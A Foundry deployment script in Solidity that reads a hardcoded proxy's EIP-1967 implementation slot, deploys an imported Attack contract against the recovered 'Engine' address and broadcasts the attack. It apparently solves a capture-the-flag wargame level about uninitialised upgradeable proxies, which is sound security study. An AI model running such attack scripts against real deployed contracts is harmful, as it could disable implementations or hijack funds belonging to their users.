// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

import {Script, console2} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

contract AttackScript is Script {

    Attack attack;
    address private immutable motorbike = 0x559426C89EC8e5D988862E7B43750b809Ef3B268;
    

    function run() external {
        vm.startBroadcast();

        address engineAddress = address(
            uint160( //We convert that into a uint256, then into a uint160, which is the size of an address (160 bits or 20 bytes).
                uint256( //The load() returns a bytes32 value — 32 bytes (256 bits).
                    vm.load( // vm.load(contract, slot) (from Foundry) reads raw storage from the contract at the specified storage slot.
                        motorbike,
                        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
                    )
                )
            )
        );

        console2.log("Engine address: ", engineAddress);

        attack = new Attack(engineAddress);

        attack.attack();

        vm.stopBroadcast();
    }
}